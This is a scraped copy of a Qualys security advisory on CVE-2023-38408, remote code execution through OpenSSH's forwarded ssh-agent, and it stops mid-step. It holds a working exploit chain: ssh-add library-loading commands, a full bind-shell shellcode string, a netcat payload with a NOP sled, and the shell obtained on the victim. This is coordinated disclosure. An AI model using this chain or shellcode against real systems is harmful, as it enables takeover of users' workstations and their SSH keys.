    <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fwww.qualys.com%2F2023%2F06%2F06%2Frenderdoc%2Frenderdoc.txt&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=nofBS%2FHzMRkvCgf%2FnCVxTNk7qQdAy84QcWuVMsaxPl4%3D&reserved=0><<https://www.qualys.com/2023/06/06/renderdoc/renderdoc.txt>>

This last and extreme attack vector against ssh-agent also underlines
the central point of this advisory: many shared libraries are simply not
safe to be loaded (and unloaded) in a security-sensitive program such as
ssh-agent.

========================================================================
Discussion
========================================================================

We believe that we have not exploited the full potential of this
"dlopen() then dlclose()" primitive:

- we have only investigated Ubuntu Desktop 22.04 and 21.10, but other
  versions, distributions, or operating systems might be hiding further
  surprises;

- our rudimentary fuzzer can certainly be greatly improved, and has
  definitely not tried all the combinations of shared libraries and side
  effects;

- we have identified seven attack vectors against ssh-agent (described
  in the "Results" section), but we have not analyzed in detail all the
  results of our fuzzer;

- we have not fully explored various aspects of these attack vectors:

  - it might be possible to reliably exploit the "Sigaltstack
    use-after-free" (by carefully overwriting the .data or .bss segment
    of a shared library) or the "Sigreturn to arbitrary instruction
    pointer" (by partially overwriting a leftover pointer in
    ssh-pkcs11-helper's stack);

  - we currently store our shellcode in ssh-pkcs11-helper's main() stack
    buffer only, but it might be possible to store shellcode in other
    stack buffers as well, or somehow spray the stack with shellcode,
    which would dramatically increase our chances of jumping into our
    shellcode;

    for example, we tried to spray the stack with shellcode by
    interrupting a memcpy() of controlled data with a signal handler,
    thereby spilling controlled YMM registers to the stack (inspired by
    <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fbugs.chromium.org%2Fp%2Fproject-zero%2Fissues%2Fdetail%3Fid%3D2266&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=mYENYDFpftGaac%2B5%2BGJcg%2FAKFVZhh%2BIyb6TLmRaMsfI%3D&reserved=0>)<<https://bugs.chromium.org/p/project-zero/issues/detail?id=2266>>, but
    we failed because we can memcpy() only ~10KB of data, and because we
    cannot remotely use tricks such as inotify or sched*() to precisely
    time this race;

  - it might be possible to control the mmap layout of ssh-pkcs11-helper
    with page precision (which would allow us to precisely control the
    gadget that replaces the unmapped signal handler, callback function,
    or return from syscall), but we failed to find large malloc()ations
    (which are mmap()ed) in ssh-pkcs11-helper (the only way we found to
    influence the mmap layout is to load and unload shared libraries, as
    mentioned in Step 4a/ of the "Experiments" section);

  - instead of replacing the unmapped signal handler or callback
    function (or return from syscall) with a gadget from another shared
    library, it is perfectly possible to replace it with an executable
    thread stack (made executable by loading an "execstack" library),
    but we have failed so far to control the contents of such a thread
    stack.

========================================================================
Acknowledgments
========================================================================

We thank the OpenSSH developers, and Damien Miller in particular, for
their outstanding work on this vulnerability and on OpenSSH in general.
We also thank Mitre's CVE Assignment Team for their quick response.
Finally, we dedicate this advisory to the Midnight Fox.

========================================================================
Timeline
========================================================================

2023-07-06: We sent a draft of our advisory and a preliminary patch to
the OpenSSH developers.

2023-07-07: The OpenSSH developers replied and sent us a more complete
set of patches.

2023-07-09: We sent feedback about these patches to the OpenSSH
developers.

2023-07-11: The OpenSSH developers sent us a complete set of patches,
and we sent them feedback about these patches.

2023-07-14: The OpenSSH developers informed us that "we're aiming to
make a security-only release ... on July 19th."

2023-07-19: Coordinated release.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from seclists.org_4b997655_20250125_231138.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](30)
[By Date](date.html#31)
[![Next](/images/right-icon-16x16.png)](32)

[![Previous](/images/left-icon-16x16.png)](30)
[By Thread](index.html#31)
[![Next](/images/right-icon-16x16.png)](33)

![](/shared/images/nst-icons.svg#search)

# CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded ssh-agent

---

*From*: Qualys Security Advisory via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Wed, 19 Jul 2023 16:38:24 +0000

---

```

Qualys Security Advisory

CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded ssh-agent

========================================================================
Contents
========================================================================

Summary
Background
Experiments
Results
Discussion
Acknowledgments
Timeline

========================================================================
Summary
========================================================================

    "ssh-agent is a program to hold private keys used for public key
    authentication. Through use of environment variables the agent can
    be located and automatically used for authentication when logging in
    to other machines using ssh(1). ... Connections to ssh-agent may be
    forwarded from further remote hosts using the -A option to ssh(1)
    (but see the caveats documented therein), avoiding the need for
    authentication data to be stored on other machines."
    (<https://man.openbsd.org/ssh-agent.1>)

    "Agent forwarding should be enabled with caution. Users with the
    ability to bypass file permissions on the remote host ... can access
    the local agent through the forwarded connection. ... A safer
    alternative may be to use a jump host (see -J)."
    (<https://man.openbsd.org/ssh.1>)

Despite this warning, ssh-agent forwarding is still widely used today.
Typically, a system administrator (Alice) runs ssh-agent on her local
workstation, connects to a remote server with ssh, and enables ssh-agent
forwarding with the -A or ForwardAgent option, thus making her ssh-agent
(which is running on her local workstation) reachable from the remote
server.

While browsing through ssh-agent's source code, we noticed that a remote
attacker, who has access to the remote server where Alice's ssh-agent is
forwarded to, can load (dlopen()) and immediately unload (dlclose()) any
shared library in /usr/lib* on Alice's workstation (via her forwarded
ssh-agent, if it is compiled with ENABLE_PKCS11, which is the default).

(Note to the curious readers: for security reasons, and as explained in
the "Background" section below, ssh-agent does not actually load such a
shared library in its own address space (where private keys are stored),
but in a separate, dedicated process, ssh-pkcs11-helper.)

Although this seems safe at first (because every shared library in
/usr/lib* comes from an official distribution package, and no operation
besides dlopen() and dlclose() is generally performed by ssh-agent on a
shared library), many shared libraries have unfortunate side effects
when dlopen()ed and dlclose()d, and are therefore unsafe to be loaded
and unloaded in a security-sensitive program such as ssh-agent. For
example, many shared libraries have constructor and destructor functions
that are automatically executed by dlopen() and dlclose(), respectively.

Surprisingly, by chaining four common side effects of shared libraries
from official distribution packages, we were able to transform this very
limited primitive (the dlopen() and dlclose() of shared libraries from
/usr/lib*) into a reliable, one-shot remote code execution in ssh-agent
(despite ASLR, PIE, and NX). Our best proofs of concept so far exploit
default installations of Ubuntu Desktop plus three extra packages from
Ubuntu's "universe" repository. We believe that even better results can
be achieved (i.e., some operating systems might be exploitable in their
default installation):

- we only investigated Ubuntu Desktop 22.04 and 21.10, we have not
  looked into any other versions, distributions, or operating systems;

- the "fuzzer" that we wrote to test our ideas is rudimentary and slow,
  and we ran it intermittently on a single laptop, so we have not tried
  all the combinations of shared libraries and side effects;

- we initially had only one attack vector in mind (i.e., one specific
  combination of side effects from shared libraries), but we discovered
  six more while analyzing the results of our fuzzer, and we are
  convinced that more attack vectors exist.

In this advisory, we present our research, experiments, reproducible
results, and further ideas to exploit this "dlopen() then dlclose()"
primitive. We will also publish the source code of our crude fuzzer at
<https://www.qualys.com/research/security-advisories/> (warning: this code
might hurt the eyes of experienced fuzzing practitioners, but it gave us
quick answers to our many questions; it is provided "as is", in the hope
that it will be useful).

========================================================================
Background
========================================================================

The ability to load and unload shared libraries in ssh-agent was
developed in 2010 to support the addition and deletion of PKCS#11 keys:
ssh-agent forks and executes a long-running ssh-pkcs11-helper process
that dlopen()s PKCS#11 providers (shared libraries), and immediately
dlclose()s them if the symbol C_GetFunctionList cannot be found (i.e.,
if such a shared library is not actually a PKCS#11 provider, which is
the case for the vast majority of the shared libraries in /usr/lib*).

Note: ssh-agent also supports the addition of FIDO keys, by loading a
FIDO authenticator (a shared library) in a short-lived ssh-sk-helper
process; however, unlike ssh-pkcs11-helper, ssh-sk-helper is stateless
(it terminates shortly after loading a single shared library) and can
therefore not be abused by an attacker to chain the side effects of
several shared libraries.

Originally, the path of a shared library to be loaded in
ssh-pkcs11-helper was not filtered at all by ssh-agent, but in 2016 an
allow-list was added ("/usr/lib*/*,/usr/local/lib*/*" by default) in
response to CVE-2016-10009, which was published by Jann Horn (at
<https://bugs.chromium.org/p/project-zero/issues/detail?id=1009>):

- if an attacker had access to the server where Alice's ssh-agent is
  forwarded to, and had an unprivileged access to Alice's workstation,
  then this attacker could store a malicious shared library in /tmp on
  Alice's workstation and execute it with Alice's privileges (via her
  forwarded ssh-agent) -- a mild form of Local Privilege Escalation;

- if the attacker had only access to the server where Alice's ssh-agent
  is forwarded to, but could somehow store a malicious shared library
  somewhere on Alice's workstation (without access to her workstation),
  then this attacker could remotely execute this shared library (via
  Alice's forwarded ssh-agent) -- a mild form of Remote Code Execution.

Our first reaction was of course to try to bypass ssh-agent's /usr/lib*
allow-list:

- by finding a logic bug in the filter function, match_pattern_list()
  (but we failed);

- by making a path-traversal attack, for example /usr/lib/../../tmp (but
  we failed, because ssh-agent first calls realpath() to canonicalize
  the path of a shared library, and then calls the filter function);

- by finding a locally or remotely writable file or directory in
  /usr/lib* (but we failed).

Our only option, then, is to abuse side effects of the existing shared
libraries in /usr/lib*; in particular, their constructor and destructor
functions, which are automatically executed by dlopen() and dlclose().
Eventually, we realized that this is essentially a remote version of
CVE-2010-3856, which was published in 2010 by Tavis Ormandy (at
<https://seclists.org/fulldisclosure/2010/Oct/344>):

- an unprivileged local attacker could dlopen() any shared library from
  /lib and /usr/lib (via the LD_AUDIT environment variable), even when
  executing a SUID-root program;

- the constructor functions of various common shared libraries created
  files and directories whose location depended on the attacker's
  environment variables and whose creation mode depended on the
  attacker's umask;

- the local attacker could therefore create world-writable files and
  directories anywhere in the filesystem, and obtain full root
  privileges (via crond, for example).

Although the ability to load and unload shared libraries from /usr/lib*
in ssh-agent bears a striking resemblance to CVE-2010-3856, we are in a
much weaker position here, because we are trying to exploit ssh-agent
remotely, so we do not control its environment variables nor its umask
(and we do not even talk directly to ssh-pkcs11-helper, which actually
dlopen()s and dlclose()s the shared libraries: we talk to ssh-agent,
which canonicalizes and filters our requests before passing them on to
ssh-pkcs11-helper).

In fact, we do not control anything except the order in which we load
(and immediately unload) shared libraries from /usr/lib* in ssh-agent.
At that point, we almost abandoned our research, because we could not
possibly imagine how to transform this extremely limited primitive into
a one-shot remote code execution. Nevertheless, we felt curious and
decided to syscall-trace (strace) a dlopen() and dlclose() of every
shared library in the default installation of Ubuntu Desktop. We
instantly observed four surprising behaviors:

------------------------------------------------------------------------

1/ Some shared libraries require an executable stack, either explicitly
because of an RWE (readable, writable, executable) GNU_STACK ELF header,
or implicitly because of a missing GNU_STACK ELF header (in which case
the loader defaults to an executable stack): when such an "execstack"
library is dlopen()ed, the loader makes the main stack and all thread
stacks executable, and they remain executable even after dlclose().

For example, /usr/lib/systemd/boot/efi/linuxx64.elf.stub in the default
installation of Ubuntu Desktop 22.04.

------------------------------------------------------------------------

2/ Many shared libraries are marked as "nodelete" by the loader, either
explicitly because of a NODELETE ELF flag, or implicitly because they
are in the dependency list of a NODELETE library: the loader will never
unload (munmap()) such libraries, even after they are dlclose()d.

For example, /usr/lib/x86_64-linux-gnu/librt.so.1 in the default
installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

3/ Some shared libraries register a signal handler for SIGSEGV when they
are dlopen()ed, but they do not deregister this signal handler when they
are dlclose()d (i.e., this signal handler is still registered when its
code is munmap()ed).

For example, /usr/lib/x86_64-linux-gnu/libSegFault.so in the default
installation of Ubuntu Desktop 21.10.

------------------------------------------------------------------------

4/ Some shared libraries crash with a SIGSEGV as soon as they are
dlopen()ed (usually because of a NULL-pointer dereference), because they
are supposed to be loaded in a specific context, not in a random program
such as ssh-agent.

For example, most of the /usr/lib/x86_64-linux-gnu/xtables/lib*.so in
the default installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

And so an exciting idea to remotely exploit ssh-agent came into our
mind:

a/ make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack) by dlopen()ing one of the "execstack"
libraries ("surprising behavior 1/"), and somehow store a 1990-style
shellcode somewhere in this executable stack;

b/ register a signal handler for SIGSEGV and immediately munmap() its
code, by dlopen()ing and dlclose()ing one of the shared libraries from
"surprising behavior 3/" (consequently, a dangling pointer to this
unmapped signal handler is retained in the kernel);

c/ replace the unmapped signal handler's code with another piece of code
from another shared library, by dlopen()ing (mmap()ing) one of the
"nodelete" libraries ("surprising behavior 2/");

d/ raise a SIGSEGV by dlopen()ing one of the shared libraries from
"surprising behavior 4/", so that the unmapped signal handler is called
by the kernel, but the replacement code from the "nodelete" library is
executed instead (a use-after-free of sorts);

e/ hope that this replacement code (which is mapped where the signal
handler was mapped) is a useful gadget that somehow jumps into the
executable stack, exactly where our shellcode is stored.

========================================================================
Experiments
========================================================================

But "hope is not a strategy", so we decided to implement the following
6-step plan to test our remote-exploitation idea in ssh-agent:

------------------------------------------------------------------------

Step 1 - We install a default Ubuntu Desktop, download all official
packages from Ubuntu's "main" and "universe" repositories, and extract
all /usr/lib* files from these packages. These files occupy ~200GB of
disk space and include ~60,000 shared libraries.

Note: after the default installation of Ubuntu Desktop, but before the
extraction of all /usr/lib* files, we "chattr +i /etc/ld.so.cache" to
make sure that this file does not grow unrealistically (from kilobytes
to megabytes); indeed, it is mmap()ed by the loader every time dlopen()
is called, and a large file might therefore destroy the mmap layout and
prevent our fuzzer's results from being reproducible in the real world.

------------------------------------------------------------------------

Step 2 - For each shared library in /usr/lib*, we fork and execute
ssh-pkcs11-helper, strace it, and request it to dlopen() (and hence
immediately dlclose()) this shared library; if we spot anything unusual
in the strace logs (a raised signal, a clone() call, etc) or outstanding
differences in /proc/pid/maps or /proc/pid/status between before and
after dlopen() and dlclose(), then we mark this shared library as
interesting.

------------------------------------------------------------------------

Step 3 - We analyze the results of Step 2. For example, on Ubuntu
Desktop 22.04:

- 58 shared libraries make the stack executable when dlopen()ed (and the
  stack remains executable even after dlclose());

- 16577 shared libraries permanently alter the mmap layout when
  dlopen()ed (either because they are "nodelete" libraries, or because
  they allocate a thread stack or otherwise leak mmap()ed memory);

- 9 shared libraries register a SIGSEGV handler when dlopen()ed (but do
  not deregister it when dlclose()d), and 238 shared libraries raise a
  SIGSEGV when dlopen()ed;

- 2 shared libraries register a SIGABRT handler when dlopen()ed, and 44
  shared libraries raise a SIGABRT when dlopen()ed.

On Ubuntu Desktop 21.10:

- 30 shared libraries make the stack executable;

- 16172 shared libraries permanently alter the mmap layout;

- 9 shared libraries register a SIGSEGV handler, and 147 shared
  libraries raise a SIGSEGV;

- 2 shared libraries register a SIGABRT handler, and 38 shared libraries
  raise a SIGABRT;

- 1 shared library registers a SIGBUS handler, and 11 shared libraries
  raise a SIGBUS;

- 1 shared library registers a SIGCHLD handler, and 61 shared libraries
  raise a SIGCHLD;

- 1 shared library registers a SIGILL handler, and 1 shared library
  raises a SIGILL.

------------------------------------------------------------------------

Step 4 - We implement a rudimentary fuzzing strategy, by forking and
executing ssh-pkcs11-helper in a loop, and by loading (and unloading)
random combinations of the interesting shared libraries from Step 3:

a/ we randomly load zero or more shared libraries that permanently alter
the mmap layout, in the hope of creating holes in the mmap layout, thus
potentially shifting the replacement code (which will later replace the
signal handler's code) with page precision;

b/ we randomly load one shared library that registers a signal handler
but does not deregister it when dlclose()d (i.e., when munmap()ed);

c/ we randomly load zero or more shared libraries that alter the mmap
layout (again), thus replacing the unmapped signal handler's code with
another piece of code (a hopefully useful gadget) from another shared
library (a "nodelete" library);

d/ we randomly load one shared library that raises the signal that is
caught by the unmapped signal handler: the replacement code (gadget) is
executed instead, and if it jumps into the stack (a SEGV_ACCERR with a
RIP register that points to the stack, because we did not make the stack
executable in this Step 4), then we mark this particular combination of
shared libraries as interesting.

Surprise: we actually get numerous jumps to the stack in this Step 4,
usually because the signal handler's code is replaced by a "jmp REG",
"call REG", or "pop; pop; ret" gadget, and the "REG" or popped RIP
register happens to point to the stack at the time of the jump.

------------------------------------------------------------------------

Step 5 - We implement this extra step to test whether the interesting
combinations of shared libraries from Step 4 actually jump into our
shellcode in the stack, or into uncontrolled data in the stack:

a/ we make the stack executable, by randomly loading one of the
"execstack" libraries from Step 3;

b/ we store ~10KB of 0xcc bytes in the stack buffer "buf" of
ssh-pkcs11-helper's main() function: 10KB is the maximum message length
that we can send to ssh-pkcs11-helper (via ssh-agent), and on amd64 0xcc
is the "int3" instruction that generates a SIGTRAP when executed;

c/ we randomly replay one of the interesting combinations of shared
libraries from Step 4: if a SIGTRAP is generated while the RIP register
points to the stack, then there is a fair chance that ssh-pkcs11-helper
jumped into our shellcode (our 0xcc bytes) in the executable stack.

Surprise: we actually get many SIGTRAPs in the stack during this Step 5,
but to our great dismay, most of these SIGTRAPs are generated because
ssh-pkcs11-helper jumps into the stack, in the middle of a pointer that
is stored on the stack and that happens to contain a 0xcc byte because
of ASLR (i.e., not because ssh-pkcs11-helper jumps into our own 0xcc
bytes in the stack).

------------------------------------------------------------------------

Step 6 - We implement this extra step to eliminate the false positives
produced by Step 5:

a/ we repeatedly replay (N times) each combination of shared libraries
that generates a SIGTRAP in the stack: if N SIGTRAPs are generated out
of N replays, then there is an excellent chance that ssh-pkcs11-helper
does indeed jump into our shellcode (our 0xcc bytes) in the stack (and
not into random bytes that happen to be 0xcc because of ASLR);

b/ if this is confirmed by a manual check (with gdb for example), then
we achieved a reliable, one-shot remote code execution in ssh-agent,
despite the very limited primitive, and despite ASLR, PIE, and NX.

========================================================================
Results
========================================================================

In this section, we present the results of our experiments:

- Signal handler use-after-free (Ubuntu Desktop 22.04)
- Signal handler use-after-free (Ubuntu Desktop 21.10)
- Callback function use-after-free
- Return from syscall use-after-free
- Sigaltstack use-after-free
- Sigreturn to arbitrary instruction pointer
- _Unwind_Context type-confusion
- RCE in library constructor

========================================================================
Signal handler use-after-free (Ubuntu Desktop 22.04)
========================================================================

This was our original idea for remotely attacking ssh-agent, as
discussed at the end of the "Background" section and as implemented in
the "Experiments" section. In this subsection, we present one of the
various combinations of shared libraries that result in a reliable,
one-shot remote code execution in ssh-agent on Ubuntu Desktop 22.04.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 22.04
(<https://old-releases.ubuntu.com/releases/22.04/ubuntu-22.04-desktop-amd64.iso>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# grep ' jammy ' /etc/apt/sources.list.backup > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three shared libraries used in this particular attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install eclipse-titan
workstation# apt-get --no-install-recommends install libkf5sonnetui5
workstation# apt-get --no-install-recommends install libns3-3v5

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice)
groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 1105

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-XXXXXXmgHTo9/agent.1104

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding (indeed,
the ssh-agent itself is running on Alice's workstation, not on the
server):

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

server# export SSH_AUTH_SOCK=/tmp/ssh-N5EjHljGRh/agent.1299

server# ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/systemd/boot/efi/linuxx64.elf.stub": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack buffer "buf" of
ssh-pkcs11-helper's main() function:

server#
SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n
"$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

- we do not use ssh-add here, because we want to send a ~10KB passphrase
  (our shellcode) to ssh-agent, but ssh-add limits the length of our
  passphrase to 1KB;

- "\x90" x 10000 is a ~10KB "NOP sled" (on amd64, 0x90 is the "nop"
  instruction);

- SHELLCODE is a "TCP bind shell" on port 31337 (from
  <https://shell-storm.org/shellcode/files/shellcode-858.html>);

- /usr/lib/modules is an existing directory whose path matches
  ssh-agent's /usr/lib* allow-list (indeed, we do not want to actually
  load a shared library here -- we just want to store our shellcode in
  the executable stack);

------------------------------------------------------------------------

3c/ we remotely register a SIGSEGV handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/titan/libttcn3-rt2-dynamic.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely replace the unmapped SIGSEGV handler's code with another
piece of code (a useful gadget) from another shared library:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0": agent refused operation

------------------------------------------------------------------------

3e/ we remotely raise a SIGSEGV in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3f/ the replacement code (gadget) is executed (instead of the unmapped
SIGSEGV handler's code) and jumps to the stack, into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice)
groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ ps axuf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
alice       1105  0.0  0.1   7968  4192 ?        Ss   09:48   0:00 ssh-agent -s
alice       1249  0.0  0.0   2888   956 ?        S    10:03   0:00  \_ [sh]
alice       1268  0.0  0.0   7204  3092 ?        R    10:14   0:00      \_ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGSEGV handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1307
...
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fb15c9b560e in std::_Rb_tree_decrement(std::_Rb_tree_node_base*) () from /lib/x86_64-linux-gnu/libstdc++.so.6

(gdb) stepi
0x00007fb15d0e1250 in ?? () from /lib/x86_64-linux-gnu/libQt5Widgets.so.5

(gdb) x/10i 0x00007fb15d0e1250
=> 0x7fb15d0e1250:      add    %rcx,%rdx
   0x7fb15d0e1253:      notrack jmp *%rdx
   ...

(gdb) stepi
0x00007fb15d0e1253 in ?? () from /lib/x86_64-linux-gnu/libQt5Widgets.so.5

(gdb) stepi
0x00007ffc2ec82691 in ?? ()

(gdb) x/10i 0x00007ffc2ec82691
=> 0x7ffc2ec82691:      nop
   0x7ffc2ec82692:      nop
   0x7ffc2ec82693:      nop
   0x7ffc2ec82694:      nop
   0x7ffc2ec82695:      nop
   0x7ffc2ec82696:      nop
   0x7ffc2ec82697:      nop
   0x7ffc2ec82698:      nop
   0x7ffc2ec82699:      nop
   0x7ffc2ec8269a:      nop

(gdb) !grep stack /proc/1307/maps
7ffc2ec66000-7ffc2ec87000 rwxp 00000000 00:00 0                          [stack]

========================================================================
Signal handler use-after-free (Ubuntu Desktop 21.10)
========================================================================

In this subsection, we present one of the various combinations of shared
libraries that result in a reliable, one-shot remote code execution in
ssh-agent on Ubuntu Desktop 21.10.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 21.10
(<https://old-releases.ubuntu.com/releases/21.10/ubuntu-21.10-desktop-amd64.iso>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# echo 'deb <https://old-releases.ubuntu.com/ubuntu/> impish main restricted universe' > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three extra shared libraries used in this attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install syslinux-common
workstation# apt-get --no-install-recommends install libgnatcoll-postgres1
workstation# apt-get --no-install-recommends install libenca-dbg

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice)
groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 912

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-GnpGKph6xbe3/agent.911

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding:

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

server# export SSH_AUTH_SOCK=/tmp/ssh-30N8pjTKWn/agent.996

server# ssh-add -s /usr/lib/syslinux/modules/efi64/gfxboot.c32
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/syslinux/modules/efi64/gfxboot.c32": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack of ssh-pkcs11-helper:

server#
